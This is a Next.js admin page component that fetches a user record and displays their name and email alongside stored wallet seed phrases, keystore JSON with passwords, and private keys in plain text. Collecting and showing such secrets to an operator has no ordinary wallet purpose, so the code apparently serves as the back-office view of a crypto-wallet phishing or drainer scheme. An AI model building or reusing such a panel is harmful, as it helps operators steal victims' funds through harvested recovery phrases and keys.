import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { getUserByUidWithWalletStatus } from '@/lib/actions/user';
import { notFound } from 'next/navigation';

type Props = { params: Promise<{ userId: string }> }

async function User({ params }: Props) {
    const userId = (await params).userId;
    const user = await getUserByUidWithWalletStatus(userId)
    if (!user) {
        notFound();
    }

    return (
        <section className="max-w-5xl mx-auto">
            <div className="space-y-8">
                <h2 className="text-xl font-semibold mb-2">User Details</h2>
                <div className="overflow-x-auto">
                    <Table className="min-w-[600px]">
                    <TableHeader>
                        <TableRow>
                        <TableHead>User Name</TableHead>
                        <TableHead>First Name</TableHead>
                        <TableHead>Last Name</TableHead>
                        <TableHead>Email</TableHead>
                        </TableRow>
                    </TableHeader>
                    <TableBody>
                        <TableRow>
                        <TableCell>{user.userName}</TableCell>
                        <TableCell>{user.fullName || "No name"}</TableCell>
                        <TableCell>{user.lastName || "No name"}</TableCell>
                        <TableCell>{user.email}</TableCell>
                        </TableRow>
                    </TableBody>
                    </Table>
                </div>

                <div>
                    <h2 className="text-xl font-semibold mb-2">Phrases</h2>
                    <div className="overflow-x-auto">
                    {user.phrases && user.phrases.length > 0 ? (
                        <ul className="flex flex-col gap-4 min-w-[400px] pl-3">
                        {user.phrases.map((phrase, idx) => (
                            <li key={idx} className="whitespace-nowrap">{phrase}</li>
                        ))}
                        </ul>
                    ) : (
                        <div className="text-gray-500">No data found</div>
                    )}
                    </div>
                </div>

                <div>
                    <h2 className="text-xl font-semibold mb-2">Keystore JSON</h2>
                    <div className="overflow-x-auto">
                    {user.keystorejson && user.keystorejson.length > 0 ? (
                        <Table className="min-w-[400px]">
                        <TableHeader>
                            <TableRow>
                            <TableHead>Keystore JSON</TableHead>
                            <TableHead>Password</TableHead>
                            </TableRow>
                        </TableHeader>
                        <TableBody>
                            {user.keystorejson.map(({ address, password }, index) => {
                                return (
                                    <TableRow key={index}>
                                        <TableCell>
                                            <pre className="whitespace-pre-wrap break-all">{address}</pre>
                                        </TableCell>
                                        <TableCell>
                                            <span className="font-mono">{password}</span>
                                        </TableCell>
                                    </TableRow>
                                )
                            })

                            }
                        </TableBody>
                        </Table>
                    ) : (
                        <div className="text-gray-500 text-center">No data found</div>
                    )}
                    </div>
                </div>

                <div>
                    <h2 className="text-xl font-semibold mb-2">Private Key</h2>
                    <div className="overflow-x-auto">
                    {user.privatekey && user.privatekey?.length > 0 ? (
                        <div className="flex flex-col gap-4 min-w-[400px] pl-3">
                        {user.privatekey.map((key, idx) => (
                            <div key={idx}className="whitespace-nowrap">
                            {key}
                            </div>
                        ))}
                        </div>
                    ) : (
                        <div className="text-gray-500 text-center">No data found</div>
                    )}
                    </div>
                </div>
            </div>
        </section>
    )
}

export default User